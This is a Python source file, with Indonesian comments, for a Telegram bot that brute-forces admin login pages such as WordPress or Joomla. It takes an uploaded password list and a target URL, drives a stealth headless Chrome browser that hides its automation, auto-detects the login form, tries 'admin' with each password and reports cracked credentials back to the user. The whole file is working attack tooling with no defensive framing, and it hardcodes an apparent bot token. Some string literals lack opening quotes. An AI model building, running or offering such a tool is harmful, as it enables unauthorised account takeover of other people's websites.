import os
import logging
import threading
from queue import Queue
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import time
from urllib.parse import urlparse

# Konfigurasi logging
logging.basicConfig(level=logging.INFO)

class BruteforceBot:
    def __init__(self):
        self.active_attacks = {}
        self.password_queues = {}
        self.results = {}
        
    def setup_driver(self):
        """Setup Chrome driver dengan opsi stealth"""
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
        except:
            driver = webdriver.Chrome(options=options)
            
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        return driver

    async def start(self, update: Update, context: CallbackContext):
        """Handler untuk command /start"""
        keyboard = [
            [InlineKeyboardButton("📁 Upload Password File", callback_data='upload_pass')],
            [InlineKeyboardButton("🌐 Set Target Website", callback_data='set_target')],
            [InlineKeyboardButton("⚡ Start Bruteforce", callback_data='start_attack')],
            [InlineKeyboardButton("📊 Check Status", callback_data='check_status')],
            [InlineKeyboardButton("🛑 Stop Attack", callback_data='stop_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔐 **ADMIN LOGIN BRUTEFORCE BOT**\n\n"
            "Fitur yang tersedia:\n"
            "• Upload file password.txt\n"
            • Set target website admin login\n"
            • Start brute force attack\n"
            • Real-time monitoring\n"
            • Multi-threading support\n\n"
            "Pilih opsi di bawah:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    async def button_handler(self, update: Update, context: CallbackContext):
        """Handler untuk semua tombol inline"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if query.data == 'upload_pass':
            await self.request_password_file(query)
        elif query.data == 'set_target':
            await self.request_target_url(query)
        elif query.data == 'start_attack':
            await self.start_bruteforce(query, context)
        elif query.data == 'check_status':
            await self.check_status(query, user_id)
        elif query.data == 'stop_attack':
            await self.stop_attack(query, user_id)

    async def request_password_file(self, query):
        """Meminta user mengupload file password"""
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📤 **Upload Password File**\n\n"
            "Silakan upload file password.txt yang berisi:\n"
            • Satu password per baris\n"
            • Format: .txt atau .csv\n"
            • Maksimal 10,000 password\n"
            • Encoding: UTF-8\n\n"
            "Contoh isi file:\n"
            "admin\n"
            "password123\n"
            "admin123\n"
            "123456",
            reply_markup=reply_markup
        )

    async def request_target_url(self, query):
        """Meminta URL target website"""
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🌐 **Set Target Website**\n\n"
            "Kirim URL login admin yang akan diattack:\n"
            • Format: http://example.com/admin\n"
            • Pastikan halaman login accessible\n"
            • Support berbagai CMS (WordPress, Joomla, etc)\n\n"
            "Contoh:\n"
            "• https://site.com/wp-login.php\n"
            "• http://target.com/admin/login\n"
            "• https://domain.com/administrator",
            reply_markup=reply_markup
        )

    async def handle_document(self, update: Update, context: CallbackContext):
        """Handler untuk file password yang diupload"""
        user_id = update.message.from_user.id
        document = update.message.document
        
        if document.mime_type != 'text/plain':
            await update.message.reply_text("❌ File harus format TXT")
            return
            
        file = await document.get_file()
        file_path = f"sessions/{user_id}_passwords.txt"
        await file.download_to_drive(file_path)
        
        # Validasi file
        with open(file_path, 'r') as f:
            passwords = f.readlines()
            
        if len(passwords) > 10000:
            await update.message.reply_text("❌ Password melebihi 10,000 lines")
            return
            
        self.password_queues[user_id] = Queue()
        for pwd in passwords:
            self.password_queues[user_id].put(pwd.strip())
            
        keyboard = [[InlineKeyboardButton("✅ Lanjut ke Set Target", callback_data='set_target')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ **File diterima!**\n"
            f"• Total password: {len(passwords)}\n"
            f"• Ukuran file: {document.file_size} bytes\n\n"
            f"Lanjutkan ke setting target website:",
            reply_markup=reply_markup
        )

    async def handle_url(self, update: Update, context: CallbackContext):
        """Handler untuk URL target"""
        user_id = update.message.from_user.id
        url = update.message.text
        
        # Validasi URL
        try:
            result = urlparse(url)
            if not all([result.scheme, result.netloc]):
                await update.message.reply_text("❌ Format URL tidak valid")
                return
        except:
            await update.message.reply_text("❌ URL tidak valid")
            return
            
        context.user_data['target_url'] = url
        
        keyboard = [
            [InlineKeyboardButton("⚡ Start Attack", callback_data='start_attack')],
            [InlineKeyboardButton("📊 Check Prepared Data", callback_data='check_data')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ **Target website diset!**\n"
            f"• URL: {url}\n"
            f"• User ID: admin (default)\n\n"
            f"Siap memulai attack:",
            reply_markup=reply_markup
        )

    def detect_login_form(self, driver, url):
        """Mendeteksi form login secara otomatis"""
        common_selectors = {
            'username': ['input[name="username"]', 'input[name="user"]', 'input[name="email"]', 
                        'input[type="text"]', '#username', '#user', '#email'],
            'password': ['input[name="password"]', 'input[type="password"]', '#password'],
            'submit': ['input[type="submit"]', 'button[type="submit"]', 'button.login', 
                      '.btn-login', '#loginbtn']
        }
        
        for username_selector in common_selectors['username']:
            try:
                driver.find_element(By.CSS_SELECTOR, username_selector)
                for password_selector in common_selectors['password']:
                    try:
                        driver.find_element(By.CSS_SELECTOR, password_selector)
                        return {
                            'username_selector': username_selector,
                            'password_selector': password_selector,
                            'submit_selector': common_selectors['submit'][0]
                        }
                    except:
                        continue
            except:
                continue
        return None

    def brute_force_attack(self, user_id, url, update, context):
        """Eksekusi brute force dalam thread terpisah"""
        driver = None
        try:
            driver = self.setup_driver()
            driver.get(url)
            
            # Deteksi form login
            form_info = self.detect_login_form(driver, url)
            if not form_info:
                context.bot.send_message(
                    chat_id=user_id, 
                    text="❌ Tidak dapat mendeteksi form login"
                )
                return
                
            total_passwords = self.password_queues[user_id].qsize()
            attempted = 0
            success = False
            
            while not self.password_queues[user_id].empty() and not self.active_attacks.get(user_id, {}).get('stop', False):
                password = self.password_queues[user_id].get()
                attempted += 1
                
                try:
                    # Isi form login
                    username_field = driver.find_element(By.CSS_SELECTOR, form_info['username_selector'])
                    password_field = driver.find_element(By.CSS_SELECTOR, form_info['password_selector'])
                    submit_btn = driver.find_element(By.CSS_SELECTOR, form_info['submit_selector'])
                    
                    username_field.clear()
                    password_field.clear()
                    
                    username_field.send_keys("admin")
                    password_field.send_keys(password)
                    submit_btn.click()
                    
                    # Tunggu dan cek hasil login
                    time.sleep(3)
                    
                    # Deteksi login sukses
                    current_url = driver.current_url
                    if "dashboard" in current_url or "admin" in current_url or "wp-admin" in current_url:
                        success = True
                        self.results[user_id] = {
                            'status': 'success',
                            'password': password,
                            'attempted': attempted,
                            'total': total_passwords
                        }
                        break
                        
                    # Cek error message
                    error_selectors = ['.error', '.login-error', '#login_error', '.alert-danger']
                    has_error = any(driver.find_elements(By.CSS_SELECTOR, selector) for selector in error_selectors)
                    
                    if not has_error:
                        # Jika tidak ada error, mungkin berhasil
                        success = True
                        self.results[user_id] = {
                            'status': 'success', 
                            'password': password,
                            'attempted': attempted,
                            'total': total_passwords
                        }
                        break
                        
                except Exception as e:
                    continue
                    
                # Update progress setiap 10 attempt
                if attempted % 10 == 0:
                    progress = (attempted / total_passwords) * 100
                    context.bot.send_message(
                        chat_id=user_id,
                        text=f"📊 Progress: {attempted}/{total_passwords} ({progress:.1f}%)"
                    )
            
            if not success:
                self.results[user_id] = {
                    'status': 'failed',
                    'attempted': attempted,
                    'total': total_passwords
                }
                
        except Exception as e:
            context.bot.send_message(
                chat_id=user_id,
                text=f"❌ Error: {str(e)}"
            )
        finally:
            if driver:
                driver.quit()
            self.active_attacks[user_id] = {'running': False}

    async def start_bruteforce(self, query, context: CallbackContext):
        """Memulai attack brute force"""
        user_id = query.from_user.id
        
        if user_id not in self.password_queues:
            await query.edit_message_text("❌ Upload file password terlebih dahulu")
            return
            
        if 'target_url' not in context.user_data:
            await query.edit_message_text("❌ Set target URL terlebih dahulu")
            return
            
        self.active_attacks[user_id] = {'running': True, 'stop': False}
        url = context.user_data['target_url']
        
        # Start attack in separate thread
        thread = threading.Thread(
            target=self.brute_force_attack,
            args=(user_id, url, query, context)
        )
        thread.daemon = True
        thread.start()
        
        keyboard = [
            [InlineKeyboardButton("📊 Check Status", callback_data='check_status')],
            [InlineKeyboardButton("🛑 Stop Attack", callback_data='stop_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"⚡ **Bruteforce Started!**\n\n"
            f"• Target: {url}\n"
            f"• Username: admin\n"
            f"• Total passwords: {self.password_queues[user_id].qsize()}\n"
            f"• Method: Multi-threaded\n\n"
            f"Monitoring progress di bawah:",
            reply_markup=reply_markup
        )

    async def check_status(self, query, user_id):
        """Check status attack"""
        if user_id in self.results:
            result = self.results[user_id]
            if result['status'] == 'success':
                await query.edit_message_text(
                    f"✅ **Login Success!**\n\n"
                    f"• Password found: {result['password']}\n"
                    f"• Attempted: {result['attempted']}/{result['total']}\n"
                    f"• Success rate: {(result['attempted']/result['total']*100):.1f}%\n\n"
                    f"🔑 Credentials:\n"
                    f"Username: admin\n"
                    f"Password: {result['password']}"
                )
            else:
                await query.edit_message_text(
                    f"❌ **Attack Finished - No Success**\n\n"
                    f"• Attempted: {result['attempted']} passwords\n"
                    f"• Status: Password not found\n"
                    f"• Coverage: {(result['attempted']/result['total']*100):.1f}%"
                )
        else:
            await query.edit_message_text(
                "⏳ **Attack in Progress**\n\n"
                "• Status: Running\n"
                "• Real-time monitoring active\n"
                "• Results will appear here when completed"
            )

    async def stop_attack(self, query, user_id):
        """Stop attack yang sedang berjalan"""
        if user_id in self.active_attacks:
            self.active_attacks[user_id]['stop'] = True
            await query.edit_message_text("🛑 Attack stopped by user")
        else:
            await query.edit_message_text("❌ No active attack found")

def main():
    """Main function"""
    bot = BruteforceBot()
    
    # Create sessions directory
    os.makedirs('sessions', exist_ok=True)
    
    # Setup Telegram Bot
    application = Application.builder().token("8245779348:AAHWL80AbRPsTJjrAUwzW1VOqMdkz36JbQw").build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CallbackQueryHandler(bot.button_handler))
    application.add_handler(MessageHandler(filters.Document.TEXT, bot.handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_url))
    
    # Start bot
    application.run_polling()

if __name__ == '__main__':
    main()